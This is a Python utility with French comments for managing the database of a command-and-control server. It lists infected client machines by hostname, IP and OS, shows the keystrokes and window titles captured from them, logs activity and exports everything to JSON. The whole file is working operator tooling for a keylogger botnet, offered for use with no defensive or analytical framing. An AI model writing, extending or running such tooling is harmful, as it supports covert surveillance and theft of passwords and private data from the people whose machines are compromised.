"""
Script utilitaire pour gérer et visualiser la base de données du serveur C2
"""

import sys
import argparse
from datetime import datetime
import json
from database import Database
from tabulate import tabulate

class DatabaseManager:
    def __init__(self, db_path="c2_server.db"):
        self.db = Database(db_path)
    
    def show_clients(self):
        """Afficher tous les clients"""
        clients = self.db.get_all_clients()
        
        if not clients:
            print("❌ Aucun client dans la base de données")
            return
        
        print(f"\n📊 CLIENTS ENREGISTRÉS ({len(clients)} total)\n")
        
        table_data = []
        for client in clients:
            status = "🟢 Online" if client.get('online') else "🔴 Offline"
            system_info = client.get('system_info', {})
            
            table_data.append([
                client['client_id'][:16] + "...",
                status,
                system_info.get('platform', 'N/A'),
                system_info.get('hostname', 'N/A'),
                client.get('ip', 'N/A'),
                client.get('checkin_count', 0),
                datetime.fromtimestamp(client['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
            ])
        
        headers = ['Client ID', 'Status', 'OS', 'Hostname', 'IP', 'Check-ins', 'Last Seen']
        print(tabulate(table_data, headers=headers, tablefmt='grid'))
    
    def show_client_details(self, client_id):
        """Afficher les détails d'un client spécifique"""
        client = self.db.get_client(client_id)
        
        if not client:
            print(f"❌ Client {client_id} non trouvé")
            return
        
        print(f"\n📋 DÉTAILS DU CLIENT: {client_id}\n")
        
        system_info = client.get('system_info', {})
        
        print(f"Status: {'🟢 Online' if client.get('online') else '🔴 Offline'}")
        print(f"IP Address: {client.get('ip')}")
        print(f"First Seen: {datetime.fromtimestamp(client['first_seen']).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Last Seen: {datetime.fromtimestamp(client['last_seen']).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Check-in Count: {client.get('checkin_count')}")
        
        print("\n🖥️  SYSTEM INFO:")
        print(json.dumps(system_info, indent=2))
    
    def show_keylogs(self, client_id=None, limit=50):
        """Afficher les keylogs"""
        if client_id:
            logs = self.db.get_keylogs(client_id, limit)
            print(f"\n⌨️  KEYLOGS POUR {client_id} ({len(logs)} entrées)\n")
        else:
            stats = self.db.get_keylog_stats()
            print(f"\n⌨️  STATISTIQUES KEYLOGS\n")
            print(f"Total clients avec logs: {stats['total_clients_with_logs']}")
            print(f"Total logs stockés: {stats['total_logs_stored']}\n")
            
            if not stats['clients']:
                print("Aucun keylog dans la base de données")
                return
            
            table_data = []
            for cid, cstats in stats['clients'].items():
                table_data.append([
                    cid[:16] + "...",
                    cstats['log_count'],
                    cstats['last_log_time'],
                    "🟢" if cstats['client_online'] else "🔴"
                ])
            
            headers = ['Client ID', 'Log Count', 'Last Log', 'Online']
            print(tabulate(table_data, headers=headers, tablefmt='grid'))
            return
        
        if not logs:
            print("Aucun keylog trouvé")
            return
        
        for i, log in enumerate(logs[:limit], 1):
            print(f"{i}. [{log['timestamp']}] {log['window']}")
            print(f"   Key: {log['key']}")
            print("-" * 80)
    
    def show_activity_log(self, client_id=None, limit=50):
        """Afficher l'historique des activités"""
        activities = self.db.get_activity_log(client_id, limit)
        
        if not activities:
            print("❌ Aucune activité enregistrée")
            return
        
        title = f"ACTIVITÉS" + (f" POUR {client_id}" if client_id else " GLOBALES")
        print(f"\n📝 {title} ({len(activities)} entrées)\n")
        
        table_data = []
        for activity in activities:
            table_data.append([
                datetime.fromtimestamp(activity['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
                activity['client_id'][:16] + "...",
                activity['activity_type'],
                activity['description'][:50]
            ])
        
        headers = ['Timestamp', 'Client ID', 'Type', 'Description']
        print(tabulate(table_data, headers=headers, tablefmt='grid'))
    
    def cleanup_database(self):
        """Nettoyer la base de données"""
        print("\n🧹 NETTOYAGE DE LA BASE DE DONNÉES...\n")
        
        # Nettoyer les clients inactifs
        deleted_clients = self.db.cleanup_old_clients(max_age_seconds=3600)
        print(f"✅ Clients inactifs supprimés: {deleted_clients}")
        
        # Nettoyer les anciens résultats
        self.db.cleanup_old_results(max_age_seconds=3600)
        print(f"✅ Anciens résultats de commandes nettoyés")
        
        # Nettoyer les anciens keylogs
        self.db.cleanup_old_keylogs(max_age_seconds=24 * 3600)
        print(f"✅ Anciens keylogs nettoyés (>24h)")
        
        print("\n✅ Nettoyage terminé!")
    
    def export_data(self, output_file):
        """Exporter toutes les données en JSON"""
        print(f"\n💾 EXPORT DES DONNÉES VERS {output_file}...\n")
        
        data = {
            'clients': self.db.get_all_clients(),
            'keylog_stats': self.db.get_keylog_stats(),
            'activities': self.db.get_activity_log(limit=1000),
            'export_timestamp': datetime.now().isoformat()
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        print(f"✅ Export terminé: {output_file}")
        print(f"   - Clients: {len(data['clients'])}")
        print(f"   - Keylogs: {data['keylog_stats']['total_logs_stored']}")
        print(f"   - Activités: {len(data['activities'])}")
    
    def show_stats(self):
        """Afficher les statistiques globales"""
        clients = self.db.get_all_clients()
        keylog_stats = self.db.get_keylog_stats()
        
        online_count = sum(1 for c in clients if c.get('online'))
        
        print("\n📊 STATISTIQUES GLOBALES\n")
        print(f"Clients total: {len(clients)}")
        print(f"Clients en ligne: {online_count}")
        print(f"Clients hors ligne: {len(clients) - online_count}")
        print(f"\nClients avec keylogs: {keylog_stats['total_clients_with_logs']}")
        print(f"Total keylogs: {keylog_stats['total_logs_stored']}")
        
        if clients:
            total_checkins = sum(c.get('checkin_count', 0) for c in clients)
            print(f"\nTotal check-ins: {total_checkins}")
            print(f"Moyenne check-ins/client: {total_checkins / len(clients):.1f}")


def main():
    parser = argparse.ArgumentParser(
        description="Gestionnaire de base de données pour le serveur C2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  python db_manager.py --clients                    # Lister tous les clients
  python db_manager.py --client-details CLIENT_ID   # Détails d'un client
  python db_manager.py --keylogs                    # Statistiques keylogs
  python db_manager.py --keylogs --client CLIENT_ID # Keylogs d'un client
  python db_manager.py --activities                 # Historique global
  python db_manager.py --cleanup                    # Nettoyer la BD
  python db_manager.py --export data.json           # Exporter les données
  python db_manager.py --stats                      # Statistiques globales
        """
    )
    
    parser.add_argument('--db', default='c2_server.db', help='Chemin de la base de données')
    parser.add_argument('--clients', action='store_true', help='Lister tous les clients')
    parser.add_argument('--client-details', metavar='CLIENT_ID', help='Détails d\'un client')
    parser.add_argument('--keylogs', action='store_true', help='Afficher les keylogs')
    parser.add_argument('--client', metavar='CLIENT_ID', help='Filtrer par client')
    parser.add_argument('--activities', action='store_true', help='Historique des activités')
    parser.add_argument('--cleanup', action='store_true', help='Nettoyer la base de données')
    parser.add_argument('--export', metavar='FILE', help='Exporter les données en JSON')
    parser.add_argument('--stats', action='store_true', help='Statistiques globales')
    parser.add_argument('--limit', type=int, default=50, help='Limite de résultats (défaut: 50)')
    
    args = parser.parse_args()
    
    # Si aucun argument, afficher l'aide
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    manager = DatabaseManager(args.db)
    
    if args.clients:
        manager.show_clients()
    
    if args.client_details:
        manager.show_client_details(args.client_details)
    
    if args.keylogs:
        manager.show_keylogs(args.client, args.limit)
    
    if args.activities:
        manager.show_activity_log(args.client, args.limit)
    
    if args.cleanup:
        manager.cleanup_database()
    
    if args.export:
        manager.export_data(args.export)
    
    if args.stats:
        manager.show_stats()


if __name__ == '__main__':
    main()
